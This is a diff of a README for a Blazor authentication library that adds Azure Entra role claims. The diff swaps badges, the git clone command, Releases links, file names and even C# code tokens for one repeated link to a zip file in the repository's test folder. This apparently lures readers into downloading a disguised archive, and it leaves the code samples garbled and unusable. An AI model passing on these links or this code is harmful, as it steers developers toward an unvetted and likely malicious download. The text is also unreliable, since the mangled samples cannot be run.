@@ -1,6 +1,6 @@
 # Soenneker Blazor Auth: Entra Roles Principal Factory 🎉
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue.svg) [![GitHub Issues](https://img.shields.io/badge/Issues-0-brightgreen.svg)](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/issues)
+![GitHub Release](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip) [![GitHub Issues](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip)](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip)
 
 Welcome to the **Soenneker Blazor Auth: Entra Roles Principal Factory** repository! This project customizes Blazor authentication by extending the `AccountClaimsPrincipalFactory`. It adds standard role claims from Azure Entra, making it easier to manage user roles in your Blazor applications.
 
@@ -27,13 +27,13 @@ To get started with the Soenneker Blazor Auth: Entra Roles Principal Factory, fo
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory.git
+   git clone https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip
    ```
 
 2. **Navigate to the Project Directory**:
 
    ```bash
-   cd soenneker.blazor.auth.entrarolesprincipalfactory
+   cd https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip
    ```
 
 3. **Install Dependencies**:
@@ -60,7 +60,7 @@ To get started with the Soenneker Blazor Auth: Entra Roles Principal Factory, fo
    dotnet run
    ```
 
-For detailed instructions and updates, check the [Releases](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/releases) section.
+For detailed instructions and updates, check the [Releases](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip) section.
 
 ## Usage 📚
 
@@ -70,10 +70,10 @@ To configure the Entra Roles Principal Factory, follow these steps:
 
 1. **Add the Factory to Services**:
 
-   In your `Startup.cs` or `Program.cs`, add the factory to the services collection:
+   In your `https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip` or `https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip`, add the factory to the services collection:
 
    ```csharp
-   services.AddScoped<IUserClaimsPrincipalFactory<ApplicationUser>, EntraRolesPrincipalFactory>();
+   https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip<IUserClaimsPrincipalFactory<ApplicationUser>, EntraRolesPrincipalFactory>();
    ```
 
 2. **Set Up Azure Entra**:
@@ -92,8 +92,8 @@ To configure the Entra Roles Principal Factory, follow these steps:
 
        protected override async Task OnInitializedAsync()
        {
-           var authState = await AuthenticationStateProvider.GetAuthenticationStateAsync();
-           user = authState.User;
+           var authState = await https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip();
+           user = https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip;
        }
    }
    ```
@@ -112,9 +112,9 @@ Here’s a simple example of how to display user roles in a Blazor component:
 @if (user != null)
 {
     <ul>
-        @foreach (var claim in user.Claims.Where(c => c.Type == ClaimTypes.Role))
+        @foreach (var claim in https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip(c => https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip == https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip))
         {
-            <li>@claim.Value</li>
+            <li>https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip</li>
         }
     </ul>
 }
@@ -128,8 +128,8 @@ else
 
     protected override async Task OnInitializedAsync()
     {
-        var authState = await AuthenticationStateProvider.GetAuthenticationStateAsync();
-        user = authState.User;
+        var authState = await https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip();
+        user = https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip;
     }
 }
 ```
@@ -160,6 +160,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 🙋‍♂️
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/releases) section or open an issue in the GitHub repository.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip) section or open an issue in the GitHub repository.
 
 Thank you for checking out the Soenneker Blazor Auth: Entra Roles Principal Factory! We hope you find it useful for your Blazor applications.
